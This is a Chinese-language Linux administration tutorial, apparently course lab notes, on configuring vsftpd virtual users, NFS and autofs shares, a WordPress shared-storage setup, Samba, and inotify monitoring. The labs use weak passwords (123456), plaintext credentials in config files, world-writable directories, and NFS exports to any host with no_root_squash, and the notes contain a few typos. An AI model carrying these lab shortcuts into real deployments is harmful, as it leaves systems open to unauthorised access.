#### 39.3.3vsftpd虚拟用户

- 虚拟用户：给特定服务使用的用户帐号
- 所有虚拟用户会统一映射为一个指定的系统帐号：访问共享位置，即为此系统帐号的家目录
- 各虚拟用户可被赋予不同的访问权限，通过匿名用户的权限控制参数进行指定

##### 39.3.3.1基于DB数据库文件实现FTP虚拟用户

```
#1.虚拟用户帐号的存储方式
1.1文件：创建文本文件，奇数行为用户名，偶数行为密码,再被编码为hash 格式Berkeley DB database文件
db_load -T -t hash -f vusers.txt vusers.db

1.2关系型数据库中的表中：实时查询数据库完成用户认证
vsftpd 支持mysql库：pam要依赖于pam-mysql
/lib64/security/pam_mysql.so
/usr/share/doc/pam_mysql-0.7/README




#2.创建用户数据库文件
[root@centos8 ~]# cd /etc/vsftpd/
[root@centos8 vsftpd]# vim users.txt
xiaoming
123456
xiaohong
123456
[root@centos8 vsftpd]# chmod 600 users.txt
[root@centos8 vsftpd]# db_load -T -t hash -f users.txt users.db
[root@centos8 vsftpd]# chmod 600 users.db
[root@centos8 vsftpd]# systemctl restart vsftpd




#3.创建用户和访问FTP目录
[root@centos8 vsftpd]# useradd -d /data/ftproot -s /sbin/nologin -r vuser
[root@centos8 vsftpd]# mkdir -pv /data/ftproot/upload
[root@centos8 vsftpd]# setfacl -m u:vuser:rwx /data/ftproot/upload
[root@centos8 vsftpd]# systemctl restart vsftpd




#4.创建pam配置文件
[root@centos8 vsftpd]# vim /etc/pam.d/vsftpd.db
#验证用户身份用的
auth required pam_userdb.so db=/etc/vsftpd/users
account required pam_userdb.so db=/etc/vsftpd/users
[root@centos8 vsftpd]# systemctl restart vsftpd



#5.指定pam配置文件
[root@centos8 vsftpd]# vim /etc/vsftpd/vsftpd.conf
guest_enable=YES
guest_username=vuser #把所有的操作系统账号映射成虚拟账号
pam_service_name=vsftpd.db
[root@centos8 vsftpd]# systemctl restart vsftpd




#6.虚拟用户建立独立的配置文件
#6.1#指定各个用户配置文件存放的路径
[root@centos8 vsftpd]# vim /etc/vsftpd/vsftpd.conf
user_config_dir=/etc/vsftpd/conf.d/
[root@centos8 vsftpd]# mkdir /etc/vsftpd/conf.d/

#6.1创建各用户自已的配置文件,允许xiaoming用户可读写，其它用户只读
[root@centos8 vsftpd]# vim conf.d/xiaoming
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
[root@centos8 vsftpd]# systemctl restart vsftpd

#6.2创建各用户自已的家目录
[root@centos8 vsftpd]# mkdir /data/ftproot1
[root@centos8 vsftpd]# mkdir /data/ftproot2
[root@centos8 vsftpd]# touch /data/ftproot1/1.txt
[root@centos8 vsftpd]# touch /data/ftproot2/2.txt
#登录目录改变至指定的目录
#指定xiaoming看到的家目录
[root@centos8 vsftpd]# vim /etc/vsftpd/conf.d/xiaoming
local_root=/data/ftproot1
#指定xiaohong看到的家目录
[root@centos8 vsftpd]# vim /etc/vsftpd/conf.d/xiaohong
local_root=/data/ftproot2
[root@centos8 vsftpd]# systemctl restart vsftpds
```

##### 39.3.3.2基于MYSQL实现FTP虚拟用户

![1655042174077](linuxSRE.assets/1655042174077.png)

**环境准备:**

```
利用 pam_mysql 模块可以实现基于MySQL的FTP虚拟用户功能
项目网站：https://sourceforge.net/projects/pam-mysql/
注意:因为此项目年代久远不再更新，当前只支持CentOS 6,7，不支持CentOS 8


本实验在两台主机上实现
一台做为FTP服务器,CentOS 7 10.0.0.7
一台做MySQL(不要使用mysql8.0) 数据库服务器 10.0.0.8
```

**10.0.0.7:**

```
#1.在FTP服务器上安装vsftpd和pam_mysql包和依赖包
[root@centos7 pam_mysql-0.7RC1]# yum -y install vsftpd gcc gcc-c++ make mariadb-devel pam-devel vsftpd
[root@centos7 ~]# systemctl enable --now vsftpd



#2.把pam_mysql-0.7RC1.tar.gz拖到linux并解压
[root@centos7 ~]# tar xvf pam_mysql-0.7RC1.tar.gz -C /usr/local/src/
[root@centos7 ~]# cd /usr/local/src/pam_mysql-0.7RC1/



#3.pam-mysql源码进行编译
[root@centos7 pam_mysql-0.7RC1]# ./configure --with-pam-mods-dir=/lib64/security
[root@centos7 pam_mysql-0.7RC1]# make install



#4.在FTP服务器上建立pam认证所需文件
[root@centos7 pam_mysql-0.7RC1]# vim /etc/pam.d/vsftpd.mysql
auth required pam_mysql.so user=vsftpd passwd=123456 host=10.0.0.8 db=vsftpd table=users usercolumn=name passwdcolumn=password crypt=2
account required pam_mysql.so user=vsftpd passwd=123456 host=10.0.0.8 db=vsftpd table=users usercolumn=name passwdcolumn=password crypt=2



#5.建立相应用户和修改vsftpd配置文件
#5.1建立虚拟用户映射的系统用户及对应的目录
[root@centos7 pam_mysql-0.7RC1]# useradd -s /sbin/nologin -d /data/ftproot -r vuser
[root@centos7 pam_mysql-0.7RC1]# mkdir -pv /data/ftproot/upload
[root@centos7 pam_mysql-0.7RC1]# setfacl -m u:vuser:rwx /data/ftproot/upload

#5.2确保/etc/vsftpd/vsftpd.conf中已经启用了以下选项
[root@centos7 pam_mysql-0.7RC1]# vim /etc/vsftpd/vsftpd.conf
#z最后一行添加下面项
pam_service_name=vsftpd.mysql
guest_enable=YES
guest_username=vuser
[root@centos7 pam_mysql-0.7RC1]# systemctl restart vsftpd



#6.在FTP服务器上配置虚拟用户具有不同的访问权限
#6.1配置vsftpd为虚拟用户使用配置文件目录
[root@centos7 pam_mysql-0.7RC1]# vim /etc/vsftpd/vsftpd.conf
#添加如下选项
user_config_dir=/etc/vsftpd/conf.d/


#6.2配置虚拟用户的访问权限
[root@centos7 pam_mysql-0.7RC1]# mkdir /etc/vsftpd/conf.d/
#创建alice对应的文件
[root@centos7 pam_mysql-0.7RC1]# vim /etc/vsftpd/conf.d/alice
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
local_root=/data/ftproot1

#创建bob对应的文件
[root@centos7 pam_mysql-0.7RC1]# vim /etc/vsftpd/conf.d/bob
#不允许上传
local_root=/data/ftproot2

[root@centos7 pam_mysql-0.7RC1]# mkdir /data/ftproot1/upload/ -pv  #alice根目录
[root@centos7 pam_mysql-0.7RC1]# mkdir /data/ftproot2/upload/ -pv  #bob根目录
[root@centos7 pam_mysql-0.7RC1]# touch  mkdir /data/ftproot2/upload/bob.txt
[root@centos7 pam_mysql-0.7RC1]# chown vuser.vuser /data/ftproot1/upload/
#这样alice访问的根目录是/data/ftproot1/且对upload具有写权限
[root@centos7 pam_mysql-0.7RC1]# systemctl restart vsftpd
```

**10.0.0.8:**

```
#1.在数据库服务器上安装mysql数据库
[root@centos8 vsftpd]# yum -y install mariadb-server
[root@centos8 vsftpd]# systemctl enable --now mariadb



#2.在数据库服务上配置数据库支持vsftpd服务
[root@centos8 ~]#mysql
MariaDB [(none)]> CREATE DATABASE vsftpd;
MariaDB [(none)]> USE vsftpd;
MariaDB [vsftpd]>  CREATE TABLE users (
    -> id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
    -> name CHAR(50) BINARY NOT NULL, #区分大小写
    -> password CHAR(48) BINARY NOT NULL
    -> );
MariaDB [vsftpd]> INSERT INTO users(name,password) values('alice',password('123456'));
MariaDB [vsftpd]> INSERT INTO users(name,password) values('bob',password('123456'));
MariaDB [vsftpd]>  select * from users;
+----+-------+-------------------------------------------+
| id | name  | password                                  |
+----+-------+-------------------------------------------+
|  1 | alice | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
|  2 | bob   | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
+----+-------+-------------------------------------------+
2 rows in set (0.000 sec)



#3.创建连接的数据库用户
MariaDB [vsftpd]> GRANT SELECT ON vsftpd.* TO vsftpd@'10.0.0.%' IDENTIFIED BY '123456';
MariaDB [vsftpd]> FLUSH PRIVILEGES;
```

**10.0.0.153(测试FTP)**

```
#1.测试alice和bob是否能成功登录ftp
[22:52:05 liu@ubuntu1804 ~]$ftp 10.0.0.7
Connected to 10.0.0.67.
220 (vsFTPd 3.0.2)
Name (10.0.0.67:liu): alice/bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 0        0               6 Jun 12 22:45 upload
226 Directory send OK.




#2.测试alice是否对upload文件夹写权限
[23:09:02 liu@ubuntu1804 ~]$ftp 10.0.0.7
Connected to 10.0.0.67.
220 (vsFTPd 3.0.2)
Name (10.0.0.67:liu): alice    
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 998      996             6 Jun 12 23:02 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> lcd /etc/
Local directory now /etc
ftp> put hosts
local: hosts remote: hosts
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
211 bytes sent in 0.00 secs (2.9592 MB/s)




#3.测试bob设置的专有权限
[23:16:09 liu@ubuntu1804 ~]$ftp 10.0.0.7
Connected to 10.0.0.67.
220 (vsFTPd 3.0.2)
Name (10.0.0.67:liu): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0              21 Jun 12 23:15 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Jun 12 23:15 bob.txt
226 Directory send OK.
```

### 39.4 NFS服务(重点)

#### 39.4.1NFS工作原理

![1655089835158](linuxSRE.assets/1655089835158.png)

```
NFS：Network File System 网络文件系统，基于内核的文件系统。Sun 公司开发，通过使用 NFS，用户和程序可以像访问本地文件一样访问远端系统上的文件，基于RPC（Remote Procedure Call Protocol 远程过程调用）实现


RPC采用C/S模式，客户机请求程序调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行
```

![1655090319171](linuxSRE.assets/1655090319171.png)

#### 39.4.2NFS共享服务实现

```
#1.安装nfs的包
[root@centos7 ~]# yum -y install nfs-utils
[root@centos8 ~]# systemctl enable --now nfs-server



#2.创建需要共享的文件夹
[root@centos8 ~]# mkdir /data/nfsdir{1,2}
[root@centos8 ~]# touch /data/nfsdir1/nfs1.txt
[root@centos8 ~]# touch /data/nfsdir2/nfs2.txt



#3.共享规则需要写的文件
#3.1下面两种配置文件选任意一种即可
/etc/exports
/etc/exports.d/*.exports


#3.2格式说明
anonymous：表示使用*通配所有客户端
单个主机：ipv4，ipv6，FQDN
IP networks：两种掩码格式均支持
172.18.0.0/255.255.0.0
172.18.0.0/16
wildcards：主机名通配，例如:*.magedu.com，IP不可以
netgroups：NIS域的主机组，@group_name



#3.3每个条目指定目录导出到的哪些主机，及相关的权限和选项
默认选项：(ro,sync,root_squash,no_all_squash)
ro,rw 只读和读写
async 异步，数据变化后不立即写磁盘，先写入到缓冲区中，过一段时间再写入磁盘，性能高,安全性低
sync（1.0.0后为默认）同步，数据在请求时立即写入共享存储磁盘,性能低,安全性高
root_squash （默认）远程root映射为nfsnobody,UID为65534，CentOS8 为nobody,CentOS 7以前的版本为nfsnobody
no_root_squash 远程root映射成NFS服务器的root用户
all_squash 所有远程用户(包括root)都变nfsnobody,CentOS8 为nobody
no_all_squash （默认）保留共享文件的UID和GID
anonuid和anongid 统一压榨成指定的用户 


#3.4案例：centos8修改配置文件
[root@centos8 ~]# vim /etc/exports
/data/nfsdir1 *   #客户端只可读
/data/nfsdir1 *(rw)   #客户端变成可读可写
/data/nfsdir1 *(rw,no_root_squash,all_squash,anonuid=88,anongid=88)  #全部压榨成指定id
/data/nfsdir1 *(ro,no_root_squash,all_squash,anonuid=88,anongid=88) 10.0.0.153(rw) #除了10.0.0.153别的机器都是只读


[root@centos8 ~]# exportfs -r
exportfs: No options for /data/nfsdir1 *: suggest *(sync) to avoid warning
[root@centos8 ~]# exportfs -v
/data/nfsdir1 	<world>(sync,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)



#3.5利用ubuntu测试
[09:18:09 liu@ubuntu1804 ~]$sudo apt install nfs-common
[09:17:32 liu@ubuntu1804 ~]$showmount -e 10.0.0.8
Export list for 10.0.0.8:
/data/nfsdir1 *




#3.6把远程的文件挂载到本地文件夹中
[10:22:25 liu@ubuntu1804 ~]#mkdir /mnt/nfs1/
[10:22:25 liu@ubuntu1804 ~]#mount 10.0.0.8:/data/nfsdir1/ /mnt/nfs1
[10:25:23 liu@ubuntu1804 ~]#ls /mnt/nfs1/
#挂载成功
nfs1.txt
[10:36:25 liu@ubuntu1804 nfs1]#ll
#远程root想访问nfs服务器的时候将映射成nobody
#远程的普通用户liu访问nfs服务器的时候将映射成liu
total 4
drwxrwxrwx 2 liu    root      59 Jun 14 10:36 ./
drwxr-xr-x 3 liu    root    4096 Jun 14 09:24 ../
-rw-r--r-- 1 nobody nogroup    0 Jun 14 10:36 aaa.txt




#3.7想要让远程主机拥有写权限
#方式一：
[root@centos8 ~]# chmod 777 /data/nfsdir1  
#方式二：给nobody写权限即可
[root@centos8 ~]# setfacl -m u:nobody:rwx /data/nfsdir1  
#取消权限
[root@centos8 ~]# setfacl -b /data/nfsdir1
#方式三：
[root@centos8 ~]# vim /etc/exports
/data/nfsdir1 *(rw,no_root_squash)   #客户端变成可读可写并且不压榨远程root





#3.8把所有的用户全部压榨成指定用户(解决id不统一)
[root@centos8 ~]# chmod 777 /data/nfsdir1
[root@centos8 ~]# groupadd -g 88 www
[root@centos8 ~]# useradd -u 88 -g www www  全部压榨成www
#[root@centos8 ~]# userdel -r www 
[root@centos8 ~]# id www
uid=88(www) gid=88(www) groups=88(www)
[root@centos8 ~]# vim /etc/exports
/data/nfsdir1 *(rw,no_root_squash,all_squash,anonuid=88,anongid=88)  #全部压榨成指定id
[root@centos8 nfsdir1]# exportfs -r
[root@centos8 nfsdir1]# exportfs -v
[root@centos8 nfsdir1]# pwd
/data/nfsdir1
[root@centos8 nfsdir1]# ll
#压榨成功！！！！都映射成www了
total 1
-rw-r--r-- 1 www    www    0 Jun 14 11:36 root.txt




#3.9实现永久挂载
[root@centos7 ~]# vim /etc/fstab
10.0.0.8:/data/nfsdir1                    /mnt/nfs                nfs     _netdev         0 0
[root@centos7 ~]# mkdir /mnt/nfs
[root@centos7 ~]# mount -a
[root@centos7 ~]# df
Filesystem             1K-blocks    Used Available Use% Mounted on
devtmpfs                  920744       0    920744   0% /dev
tmpfs                     931516       0    931516   0% /dev/shm
tmpfs                     931516    9772    921744   2% /run
tmpfs                     931516       0    931516   0% /sys/fs/cgroup
/dev/sda2              104806400 1637480 103168920   2% /
/dev/sda3               52403200   33092  52370108   1% /data
/dev/sda1                1038336  145432    892904  15% /boot
tmpfs                     186304       0    186304   0% /run/user/0
10.0.0.8:/data/nfsdir1  52403200  398336  52004864   1% /mnt/nfs   #挂载成功
```

####  39.4.3NFS共享远程主机家目录

![1655180940089](linuxSRE.assets/1655180940089.png)

**环境准备：**

```
#1.目标
将NFS的共享目录，通过autofs发布出来，做为远程主机用户的家目录


#2.共三台主机
一台主机 nfs server
IP:10.0.0.8
另两台当 nfs client
IP:10.0.0.7
IP:10.0.0.153(ubuntu)
```

**10.0.0.8:nfs-server**

```
#1.安装包
[root@centos8 ~]# yum -y install nfs-utils
[root@centos8 home]# systemctl enable --now nfs-server



#2.创建共享目录
[root@centos8 ~]# mkdir /data/home -p
[root@centos8 ~]# vim /etc/exports
/data/home 10.0.0.0/24(rw)
[root@centos8 ~]# cd /data/home/
[root@centos8 home]# mkdir mage
[root@centos8 home]# mkdir wang
[root@centos8 home]# chmod 700 mage/
[root@centos8 home]# chmod 700 wang/
[root@centos8 home]# ll
total 0
drwx------ 2 root root 6 Jun 14 18:15 mage
drwx------ 2 root root 6 Jun 14 18:15 wang
[root@centos8 home]# exportfs -r
[root@centos8 home]# exportfs -v
/data/home    	10.0.0.0/24(sync,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,no_all_squash)
```

**10.0.0.7:**

```
#1.安装包
[root@centos7 ~]# yum -y install nfs-utils
[root@centos7 ~]# systemctl enable --now nfs-server




#2.持久化挂载
[root@centos7 ~]# vim /etc/fstab
10.0.0.8:/data/home                                       /home    nfs           _netdev         0       0
[root@centos7 ~]# mount -a
[root@centos7 ~]# df
Filesystem          1K-blocks    Used Available Use% Mounted on
devtmpfs               920744       0    920744   0% /dev
tmpfs                  931516       0    931516   0% /dev/shm
tmpfs                  931516    9804    921712   2% /run
tmpfs                  931516       0    931516   0% /sys/fs/cgroup
/dev/sda2           104806400 1467472 103338928   2% /
/dev/sda3            52403200   32992  52370208   1% /data
/dev/sda1             1038336  145432    892904  15% /boot
tmpfs                  186304       0    186304   0% /run/user/0
10.0.0.8:/data/home  52403200  398336  52004864   1% /home
```

**10.0.0.153:**

```
#1.安装包
root@ubuntu1804:~# sudo apt install nfs-common -y


#2.持久化挂载
root@ubuntu1804:~# vim /etc/fstab
10.0.0.8:/data/home                                       /home    nfs           _netdev         0       0
root@ubuntu1804:~# mount -a
root@ubuntu1804:~# df
Filesystem          1K-blocks    Used Available Use% Mounted on
udev                   975892       0    975892   0% /dev
tmpfs                  201748     940    200808   1% /run
/dev/sda1            95595940 2616028  88080792   3% /
tmpfs                 1008720       0   1008720   0% /dev/shm
tmpfs                    5120       0      5120   0% /run/lock
tmpfs                 1008720       0   1008720   0% /sys/fs/cgroup
/dev/sda2              945144   81424    798492  10% /boot
/dev/sda5            47797996   53272  45286972   1% /data
tmpfs                  201744       0    201744   0% /run/user/1000
10.0.0.8:/data/home  52403200  398336  52004864   1% /home




#3.查看是否漫游成功
root@ubuntu1804:~# su -wang
root@ubuntu1804:~# touch liu.txt
```

#### 39.4.4NFS共享存储的LAMP架构

![1655218141442](linuxSRE.assets/1655218141442.png)

```
环境准备：
四台主机
LAP:
10.0.0.28  10.0.0.38
MYSQL:
10.0.0.8
NFS Server:
10.0.0.18
```

**windows客户端：**

![1655218336869](linuxSRE.assets/1655218336869.png)

![1655218659115](linuxSRE.assets/1655218659115.png)

![1655219924642](linuxSRE.assets/1655219924642.png)

**10.0.0.28:**

```
LAP:
10.0.0.28  10.0.0.38
#1.安装相关的包
[root@web1 ~]# yum -y install httpd php-fpm php-mysqlnd nfs-utils php-json
[root@web1 ~]# systemctl enable --now httpd php-fpm



#2.持久化挂载
[root@web1 ~]# vim /etc/fstab
10.0.0.18:/data/wordpress                 /var/www/html           nfs     _netdev         0 0
[root@web1 ~]# showmount -e 10.0.0.18
Export list for 10.0.0.18:
/data/wordpress 10.0.0.0/24
[root@web1 ~]# mount -a
#如果遇到错误
[root@web1 ~]# cat /var/log/php-fpm/www-error.log
```

**10.0.0.38:**

```
LAP:
10.0.0.28  10.0.0.38
#1.安装相关的包
[root@web2 ~]# yum -y install httpd php-fpm php-mysqlnd nfs-utils php-json
[root@web2 ~]# systemctl enable --now httpd php-fpm



#2.持久化挂载
[root@web2 ~]# vim /etc/fstab
10.0.0.18:/data/wordpress                 /var/www/html           nfs     _netdev         0 0
[root@web2 ~]# showmount -e 10.0.0.18
Export list for 10.0.0.18:
/data/wordpress 10.0.0.0/24
[root@web2 ~]# mount -a
```

**10.0.0.8:**

```
MYSQL:10.0.0.8
#1.安装相关包
[root@mysql ~]# yum -y install mysql-server
[root@mysql ~]# systemctl enable --now mysqld




#2.创建wordrpess的数据库
[root@mysql ~]# mysql
mysql> create database wordpress;
mysql> create user wordpress@'10.0.0.%' identified by '123456';
mysql> grant all on wordpress.* to wordpress@'10.0.0.%'；



#3.自动挂载
[root@mysql ~]# yum -y install autofs nfs-utils
#想要把/d1/d2/d3 <---- 10.0.0.18:/data/wordpress
[root@mysql ~]# vim /etc/auto.master
# For details of the format look at auto.master(5).
/d1/d2  /etc/test.txt
[root@mysql ~]# vim /etc/test.txt
d3  -fstype=nfs   10.0.0.18:/data/wordpress
[root@mysql ~]# systemctl restart autofs
[root@mysql ~]# tree /d1/d2/
/d1/d2/

0 directories, 0 files
[root@mysql ~]# ls /d1/d2/
#注意现在还没有开自动挂载,只有ls /d1/d2/d3才开启自动挂载
[root@mysql ~]# ls /d1/d2/d3
#自动挂载成功！！！！
index.php             wp-config.php         wp-login.php
license.txt           wp-config-sample.php  wp-mail.php
readme.html           wp-content            wp-settings.php
wp-activate.php       wp-cron.php           wp-signup.php
wp-admin              wp-includes           wp-trackback.php
wp-blog-header.php    wp-links-opml.php     xmlrpc.php
wp-comments-post.php  wp-load.php
[root@mysql ~]# df
Filesystem                1K-blocks    Used Available Use% Mounted on
devtmpfs                     894000       0    894000   0% /dev
tmpfs                        921932       0    921932   0% /dev/shm
tmpfs                        921932   17512    904420   2% /run
tmpfs                        921932       0    921932   0% /sys/fs/cgroup
/dev/sda2                 104806400 5391872  99414528   6% /
/dev/sda3                  52403200  398400  52004800   1% /data
/dev/sda1                   1038336  230160    808176  23% /boot
tmpfs                        184384       4    184380   1% /run/user/0
10.0.0.18:/data/wordpress  52403200  470272  51932928   1% /d1/d2/d3   #没有手动挂载
```

**10.0.0.18:**

```
NFS Server:10.0.0.18
#1.创建共享目录
root@nfs:~# yum -y install nfs-utils
root@nfs:~# mkdir /data/wordpress
root@nfs:~# chmod 777 /data/wordpress/
root@nfs:~# systemctl enable --now nfs-server.service 



#2.配置nfs文件
root@nfs:~# vim /etc/exports
/data/wordpress 10.0.0.0/24(rw)
root@nfs:~# exportfs -r
root@nfs:~# exportfs -v
/data/wordpress
		10.0.0.0/24(sync,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,no_all_squash)
		
		
		
#3.配置wordpress
root@nfs:~# wget https://cn.wordpress.org/latest-zh_CN.tar.gz
root@nfs:~# tar xf latest-zh_CN.tar.gz
root@nfs:~# mv wordpress/* /data/wordpress/



#4.创建wp-content写权限
root@nfs:~# chown -R 48.48 /data/wordpress/wp-content/
#root@nfs:~# chown -R www.www /data/wordpress/wp-content/
root@nfs:~# groupadd -g 48 www
root@nfs:~# useradd -r -u 48 -g www -s /sbin/nologin www
#方式二：压榨成同一个账号
/data/wordpress 10.0.0.0/24(rw,all_squash,anonuid=88,anongid=88)
root@nfs:~# exportfs -r
root@nfs:~# exportfs -v
```

### 39.5 SAMBA服务(了解)

#### 39.5.1SAMBA实现网络共享

```
#1.相关包：
samba 提供smb服务器端
samba-client 客户端软件
samba-common 通用软件
cifs-utils smb客户端工具
samba-winbind 和AD相关


#2.环境准备
10.0.0.8 当服务器
10.0.0.7 当客户端
```

**windows访问：**

![1655261527362](linuxSRE.assets/1655261527362.png)

![1655263329931](linuxSRE.assets/1655263329931.png)

**10.0.0.8：**

```
#1.安装包
[root@centos8 ~]# yum -y install samba cifs-utils
[root@centos8 ~]# systemctl enable --now smb



#2.查看拥有的samba账号
[root@centos8 ~]# pdbedit -L


#3.创建samba账号
[root@centos8 ~]# useradd smb1
[root@centos8 ~]# smbpasswd -a smb1
New SMB password:
Retype new SMB password:123456
Added user smb1.
[root@centos8 share1]# pdbedit -L
smb1:1000:
smb3:1002:
smb2:1001:


#4.删除samba账号
[root@centos8 ~]# smbpasswd -x smb2
Deleted user smb2.


#5.修改samba用户密码
[root@centos8 ~]# smbpasswd smb2


#6.上传文件家目录
[root@centos8 ~]# chmod 777 /data/share
[root@centos8 ~]# vim /etc/samba/smb.conf
[share1]
path=/data/smbshare1
writable=yes

[root@centos8 ~]# ls ~smb1/
anaconda-ks.cfg


#7.共享指定文件
#配置特定目录共享
[共享名称]  #远程网络看到的共享名称
comment #注释信息
path #所共享的目录路径
public #能否被guest访问的共享，默认no，和guest=ok 类似
browsable #是否允许所有用户浏览此共享,默认为yes,no为隐藏
writable=yes #可以被所有用户读写，默认为no
read only=no #和writable=yes等价，如与以上设置冲突，放在后面的设置生效，默认只读
write list   #用户，@组名，+组名 之间用逗号分隔，如：writable=no，列表中用户或组可读写，不在列表中用户只读
valid users #特定用户才能访问该共享，如为空，将允许所有用户，用户名之间用空格分隔

#指定目录
[root@centos8 ~]# mkdir /data/smbshare1
[root@centos8 ~]# touch /data/smbshare1/a.txt
#修改配置文件
[root@centos8 ~]# vim /etc/samba/smb.conf
[share1]
path=/data/smbshare1
writable=yes




#8.指定不同的用户访问不同的文件夹
#修改samba配置文件
vim /etc/samba/smb.conf
#在[global]下加一行
config file= /etc/samba/conf.d/%U  #说明：%U表示用户名
[share1]
path=/data/smbshare1
public=yes

mkdir  /etc/samba/conf.d/
#针对smb1和smb2用户创建单独的配置文件
vim /etc/samba/conf.d/smb1
[share]
path=/data/share1
Read only= NO 等价于writable = yes     
#说明：默认为744
vim /etc/samba/conf.d/smb2
[share]
path=/data/share2
systemctl restart smb nmb
#用户smb1，smb2,smb3访问share共享目录，看到目录是不同目录
[root@centos7 ~]# smbclient //10.0.0.8/share -U smb1%123456
[root@centos7 ~]# smbclient //10.0.0.8/share -U smb2%123456




#9.持久化挂载
[root@centos7 ~]# vim /etc/fstab
//10.0.0.8/share                          /mnt/share              cifs    credentials=/etc/user.txt  0 0
[root@centos7 ~]# cat /etc/user.txt 
username=smb1
password=123456
[root@centos7 ~]# chmod 600 /etc/user.txt
[root@centos7 ~]# ls /mnt/share/
share1.txt
```

**10.0.0.7：**

```
#1.安装包
[root@centos7 ~]# yum -y install samba-client



#2.测试登录
[root@centos7 ~]# smbclient -L 10.0.0.8
Enter SAMBA\root's password:   #密码为空
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available


#3.上传文件
[root@centos7 ~]# smbclient //10.0.0.8/smb1 -U smb1%123456
smb: \> !ls
anaconda-ks.cfg  original-ks.cfg  reset.sh
smb: \> put anaconda-ks.cfg 
putting file anaconda-ks.cfg as \anaconda-ks.cfg (221.1 kb/s) (average 221.1 kb/s)



#4.测试指定共享文件夹访问
[root@centos7 ~]# smbclient //10.0.0.8/share1 -U smb1%123456
Try "help" to get a list of possible commands.
#创建的a.txt能够访问
smb: \> ls
  .                                   D        0  Wed Jun 15 11:11:43 2022
  ..                                  D        0  Wed Jun 15 11:11:35 2022
  a.txt                               N        0  Wed Jun 15 11:11:43 2022

		52403200 blocks of size 1024. 52004800 blocks available
```

### 39.6数据的实时同步

![1655286826536](linuxSRE.assets/1655286826536.png)

#### 39.6.1实现inotify

```
#1.inotify内核参数说明：
max_queued_events：inotify 事件队列最大长度，如值太小会出现 Event Queue Overflow 错误，默认值：16384, 生产环境建议调大,比如:327679
max_user_instances：每个用户创建inotify实例最大值，默认值：128
max_user_watches：可以监视的文件的总数量（inotifywait 单进程），默认值：8192,建议调大




#2.修改配置文件
root@centos8_1:~# vim /etc/sysctl.conf
fs.inotify.max_queued_events=66666
fs.inotify.max_user_watches=100000
root@centos8_1:~# sysctl -p
root@centos8_1:~# cat /proc/sys/fs/inotify/*
66666
128
100000
```

#### 39.6.2inotify-tools工具

```
#1.inotify-tools包主要工具：
inotifywait： 在被监控的文件或目录上等待特定文件系统事件（open ，close，delete等）发生，常用于实时同步的目录监控
inotifywatch：收集被监控的文件系统使用的统计数据，指文件系统事件发生的次数统计



#2.inotifywait命令
-m, --monitor 始终保持事件监听
-d, --daemon 以守护进程方式执行，和-m相似，配合-o使用
-r, --recursive 递归监控目录数据信息变化
-q, --quiet 输出少量事件信息
--exclude <pattern> 指定排除文件或目录，使用扩展的正则表达式匹配的模式实现
--excludei <pattern> 和exclude相似，不区分大小写
-o, --outfile <file> 打印事件到文件中，相当于标准正确输出，注意：使用绝对路径
-s, --syslogOutput 发送错误到syslog相当于标准错误输出
--timefmt <fmt> 指定时间输出格式
--format <fmt> 指定的输出格式；即实际监控输出内容
-e 指定监听指定的事件，如果省略，表示所有事件都进行监听




#3.环境准备
10.0.0.8：提供数据
10.0.0.18：提供备份
```

**10.0.0.7：**

```
#1.监控不同的时间
#监控一次性事件
inotifywait /data/www
Setting up watches.
Watches established.
/data/www/ CREATE f1.txt
#持续前台监控
inotifywait -mrq /data/www   --exclude=".*\.swx|\.swp"
/data/www/ OPEN f1.txt
/data/www/ ACCESS f1.txt
/data/www/ CLOSE_NOWRITE,CLOSE f1.txt
#持续后台监控，并记录日志
inotifywait -o /root/inotify.log -drq /data/www --timefmt "%Y-%m-%d %H:%M:%S" --
format "%T %w%f event: %e"
#持续前台监控特定事件
inotifywait -mrq /data/www --timefmt "%F %H:%M:%S" --format "%T %w%f event: %;e" -e create,delete,moved_to,close_write,attrib
#持续前台监控/data/www事件
inotifywait -mrq  --timefmt "%F %H:%M:%S"  --format "%T %w%f event: %;e"  /data/www





#2.监控案例：
[root@centos7 ~]# inotifywait -mr  --timefmt "%F %H:%M:%S"  --format "%T %w%f event: %;e"  /data/www
Setting up watches.  Beware: since -r was given, this may take a while!
Watches established.
2022-06-15 18:37:57 /data/www/ event: OPEN;ISDIR
2022-06-15 18:37:57 /data/www/ event: CLOSE_NOWRITE;CLOSE;ISDIR
2022-06-15 18:40:12 /data/www/ event: OPEN;ISDIR
2022-06-15 18:40:12 /data/www/ event: CLOSE_NOWRITE;CLOSE;ISDIR
2022-06-15 18:40:17 /data/www/aaaa.txt event: CREATE
